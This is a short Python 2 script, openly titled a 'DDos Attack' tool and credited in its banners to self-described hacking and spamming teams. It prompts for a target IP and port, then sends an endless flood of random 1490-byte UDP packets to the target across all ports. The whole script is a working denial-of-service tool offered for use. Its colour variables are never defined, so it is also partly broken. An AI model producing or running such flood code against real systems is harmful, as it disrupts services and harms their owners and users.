import sys
import os
import time
import socket
import random

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")

print(upurple+'''\n============================================================================================'''+color_off)

print(bgreen+      							   '''\nCEO- 𝙱𝚊𝚗𝚐𝚕𝚊𝚍𝚎𝚜𝚑 𝙷𝚊𝚌𝚔𝚒𝚗𝚐 𝙷𝚎𝚕𝚙 𝙲𝚎𝚗𝚝𝚛𝚎    '''                                   +color_off)
print(bred+'''                 	CEO- Dɑrk 420 Spɑmming Teɑm     '''                              +color_off)
print(bgreen+'''                       	 Devoloped By: 𝙍𝙞𝙝𝙖𝙣 𝘼𝙝𝙢𝙚𝙙            '''                            +color_off)



ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1